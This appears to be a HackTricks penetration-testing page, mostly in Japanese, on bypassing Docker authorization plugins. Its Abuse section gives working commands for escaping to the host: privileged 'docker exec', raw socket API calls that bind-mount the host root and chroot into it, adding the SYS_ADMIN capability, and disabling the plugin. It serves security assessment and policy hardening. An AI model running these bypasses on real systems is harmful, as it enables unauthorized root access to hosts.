# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Runtime authorization plugins は、caller が特定の daemon action を実行できるかどうかを判断する追加の policy layer です。Docker は典型的な例です。デフォルトでは、Docker daemon と通信できるユーザーは、実質的に daemon を広範囲に制御できます。Authorization plugins は、authenticated user と要求された API operation を調べ、policy に従って request を許可または拒否することで、このモデルを狭めようとします。

この topic に独立したページが必要なのは、attacker がすでに Docker API、または `docker` group のユーザーへの access を持っている場合に、exploitation model が変わるためです。このような環境では、問題は単に「daemon に到達できるか」ではなく、「daemon が authorization layer によって制限されているか、また制限されている場合、未処理の endpoint、弱い JSON parsing、または plugin-management permissions を通じてその layer を bypass できるか」です。

## Operation

request が Docker daemon に到達すると、authorization subsystem は request context を、インストール済みの 1 つ以上の plugin に渡せます。plugin は authenticated user identity、request details、選択された headers、さらに content type が適切な場合は request または response body の一部を確認します。複数の plugin を chain でき、すべての plugin が request を許可した場合にのみ access が許可されます。

このモデルは強固に見えますが、安全性は policy author が API をどれだけ完全に理解しているかに完全に依存します。`docker run --privileged` を block していても、`docker exec` を無視したり、top-level `Binds` などの代替 JSON keys を見落としたり、plugin administration を許可したりする plugin は、制限されているという誤った安心感を生みながら、直接的な privilege-escalation paths を残す可能性があります。

## Common Plugin Targets

policy review で重要な領域は次のとおりです。

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- intended policy model の範囲外で runtime actions を間接的に trigger できる endpoint

過去には、Twistlock の `authz` plugin や、`authobot` のような単純な educational plugins によって、このモデルを容易に調査できました。これらの policy files と code paths は、endpoint-to-action mapping が実際にどのように実装されているかを示していたためです。assessment work で重要な lesson は、policy author が最も目立つ CLI commands だけでなく、API surface 全体を理解しなければならないということです。

## Abuse

最初の目標は、実際に何が block されているかを把握することです。daemon が action を拒否すると、error に plugin name が leak することが多く、使用中の control を特定するのに役立ちます。
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範なエンドポイントプロファイリングが必要な場合は、`docker_auth_profiler` などのツールが役立ちます。これらは、plugin によって実際に許可されている API ルートと JSON 構造を確認するという、 otherwise repetitive な作業を自動化します。

環境でカスタム plugin を使用しており、API とやり取りできる場合は、実際にフィルタリングされるオブジェクトフィールドを列挙します：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
これらのチェックが重要なのは、多くの authorization failure が概念単位ではなく、field-specific で発生するためです。plugin は、同等の API 構造を完全にブロックせずに、CLI パターンを拒否することがあります。

### 完全な例: `docker exec` によりコンテナ作成後に権限を追加する

privileged なコンテナ作成をブロックする一方で、unconfined なコンテナの作成と `docker exec` を許可する policy は、依然として bypass される可能性があります。
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
デーモンが2番目のステップを受け入れると、ユーザーは、ポリシー作成者が制限されていると考えていたコンテナ内で、特権付きの対話型プロセスを復元したことになります。

### Raw API経由のBind Mount：完全な例

脆弱なポリシーの中には、1つのJSON形式しか検査しないものがあります。root filesystemのbind mountが一貫してブロックされていなければ、ホストを引き続きマウントできます。
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ考え方は `HostConfig` の下にも現れる場合があります：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響として、host のファイルシステムから完全に脱出できます。興味深い点は、この bypass が kernel bug ではなく、policy の不完全な適用に起因していることです。

### 完全な例: 未チェックの Capability 属性

policy が capability 関連の属性の filter を忘れている場合、attacker は危険な capability を再取得する container を作成できます:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` または同等に強力な capability が存在すると、[capabilities.md](protections/capabilities.md) および [privileged-containers.md](privileged-containers.md) で説明されている多くの breakout techniques が利用可能になります。

### 完全な例: Plugin の無効化

plugin-management operations が許可されている場合、最も簡単な bypass は control を完全にオフにすることです。
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これは、control-plane レベルでの policy failure です。authorization layer は存在しますが、制限対象であるはずの user が、それを無効化する permission を依然として保持しています。

## Checks

これらの commands は、policy layer が存在するかどうか、また、それが完全なものか表面的なものにすぎないように見えるかどうかを特定することを目的としています。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
ここで注目すべき点:

- plugin 名を含む拒否メッセージは、authorization layer の存在を確認でき、正確な実装を明らかにすることが多い。
- attacker から確認できる plugin list だけで、disable や reconfigure 操作が可能かどうかを発見できる場合がある。
- 明らかな CLI actions のみをブロックし、raw API requests をブロックしない policy は、回避不可能であると証明されるまで bypass 可能として扱うべきである。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効化されていない | authorization plugin が設定されていない限り、daemon への access は事実上 all-or-nothing | 不完全な plugin policy、allowlist ではなく blacklist を使用、plugin management を許可、field-level の見落とし |
| Podman | 一般的な直接の同等機能はない | Podman は通常、Docker 形式の authz plugin よりも、Unix permissions、rootless execution、API exposure の判断に大きく依存する | rootful Podman API を広範囲に公開、弱い socket permissions |
| containerd / CRI-O | 異なる control model | これらの runtime は通常、Docker authz plugin ではなく、socket permissions、node の trust boundaries、上位 layer の orchestrator controls に依存する | workload への socket の mount、弱い node-local trust assumptions |
| Kubernetes | Docker authz plugin ではなく、API-server と kubelet layer で authn/authz を使用 | Cluster RBAC と admission controls が主な policy layer | 過度に広範な RBAC、弱い admission policy、kubelet または runtime API の直接公開 |
{{#include ../../../banners/hacktricks-training.md}}
